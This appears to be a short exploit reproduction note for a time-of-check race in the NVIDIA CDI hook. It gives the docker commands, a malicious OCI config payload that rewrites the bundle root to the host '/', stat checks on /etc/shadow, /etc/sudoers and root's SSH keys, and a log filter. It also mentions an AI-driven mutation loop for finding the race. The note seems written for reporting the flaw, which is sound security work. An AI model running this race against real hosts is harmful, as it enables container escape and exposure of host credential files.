# Minimal CDI Hook Race Example

This is an illustrative minimal reproduction pattern extracted from live hacker skill runs against the NVIDIA CDI hook.

**Target:** nvidia-cdi-hook chmod/create-symlinks trusting attacker-controlled OCI bundle root path during privileged docker create --gpus.

## Observed Pattern

1. `docker create --gpus all --runtime nvidia ...` causes the NVIDIA runtime to write an OCI bundle and invoke the hook.

2. Immediately after create returns (or during), locate the bundle dir under /run/... containing the container ID.

3. Overwrite `state.json` and `config.json` with:

```json
{"ociVersion":"1.0.0","root":{"path":"/"},"process":{"user":{"uid":0}}}
```

4. `docker start` the container.

5. The hook (running privileged) may now resolve paths relative to host root.

## Verification Command (inside harness worker)

```bash
stat -c "%n %a" /etc/shadow /etc/passwd /etc/sudoers /root/.ssh/authorized_keys
# ... race ...
stat -c "%n %a" /etc/shadow /etc/passwd /etc/sudoers /root/.ssh/authorized_keys
```

Look for mode changes to 777 or new files created via create-symlinks.

## Monitor Filter (highly recommended)

```bash
tail -f /tmp/hacker_nvidia_fuzz.log | grep --line-buffered -E 'RACED|POSSIBLE| HIT |fchmodat.*= 0|variant root='
```

## Artifacts to Collect for Report

- The exact `docker create` command used
- The malicious OCI snippet
- Relevant strace lines showing fchmodat
- Before/after stat output
- Timestamped log lines proving timing of the race

This pattern is the direct application of TOCTOU lessons from *Art of Exploitation* combined with the AI mutation loop from the Maleh book.
